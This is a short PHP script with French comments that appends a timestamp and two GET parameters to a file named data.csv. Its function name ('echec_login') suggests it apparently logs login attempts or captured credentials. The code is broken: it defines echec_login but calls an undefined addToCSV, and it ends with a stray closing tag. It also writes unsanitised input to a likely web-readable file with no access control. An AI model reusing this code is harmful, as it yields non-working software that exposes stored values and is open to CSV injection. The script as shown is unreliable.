<?php
// Fonction pour ajouter une ligne au fichier CSV avec les données fournies
function echec_login($string1, $string2) {
    // Définir le chemin vers le fichier CSV
    $csvFile = 'data.csv';

    // Créer un tableau avec les données à ajouter
    $data = array(
        date("Y-m-d H:i:s"), // Date et heure actuelles
        $string1,
        $string2
    );

    // Ouvrir le fichier CSV en mode écriture, en créant le fichier s'il n'existe pas
    $file = fopen($csvFile, 'a');

    // Vérifier si le fichier a pu être ouvert
    if ($file !== false) {
        // Écrire la ligne dans le fichier CSV
        fputcsv($file, $data);

        // Fermer le fichier
        fclose($file);

        // Retourner true pour indiquer que l'ajout a réussi
        return true;
    } else {
        // Retourner false si l'ouverture du fichier a échoué
        return false;
    }
}

// Vérifier si les paramètres string1 et string2 sont définis
if (isset($_GET['string1'], $_GET['string2'])) {
    // Récupérer les valeurs des paramètres
    $string1 = $_GET['string1'];
    $string2 = $_GET['string2'];

    // Appeler la fonction addToCSV pour ajouter les données au fichier CSV
    if (addToCSV($string1, $string2)) {
        echo "Données ajoutées avec succès au fichier CSV.";
    } else {
        echo "Erreur : impossible d'ajouter les données au fichier CSV.";
    }
} else {
    echo "Erreur : paramètres manquants.";
}
?>

?>